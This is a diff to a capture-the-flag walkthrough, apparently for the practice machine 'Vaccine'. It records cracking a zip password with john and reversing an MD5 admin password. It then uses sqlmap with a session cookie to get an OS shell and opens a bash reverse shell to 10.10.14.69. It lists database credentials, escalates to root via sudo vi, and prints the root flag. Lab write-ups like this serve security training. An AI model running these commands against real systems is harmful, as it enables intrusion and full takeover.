@@ -47,9 +47,51 @@ zip2john backup.zip > backup.hash
 john backup.hash --show (741852963)
 unzip backup.zip in this password
 
-## Try login [index.php](./ftp/backup/index.php)
+## Try login on [index.php](./ftp/backup/index.php)
 
 username: admin
 password (md5 reverse): 2cb42f8734ea607eefed3b70af13bbd3 ( qwerty789)
 
+## Sqlmap to hack os shell
 
+sqlmap 10.10.10.46/dashboard.php?search=whatever --cookie="PHPSESSID=01aruoep6i9jf18e8ho8runboo" --os-shell
+
+**pwd**
+> /var/lib/postgresql/11/main
+
+**change cmd**
+source
+> bash -c 'bash -i >& /dev/tcp/10.10.14.69/8001 0>&1'
+destination
+> nc -lvnp 8001
+
+**id**
+> uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
+
+- postgresql account in [/var/www/html/dashboard.php](./dashboard.php)
+> username: postgres
+> password: P@s5w0rd!
+> port:     5432 (omit)
+> dbname:   carsdb
+
+## Sudo lists all privilege command can do
+
+> sudo -l
+
+Matching Defaults entries for postgres on vaccine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+- postgres can use vi in /bin/vi
+> which vi
+> /usr/bin/vi
+
+- use sudo vi to get root
+> sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+> :!/bin/bash -P
+
+root.txt
+dd6e058e814260bc70e9bbdef2715849
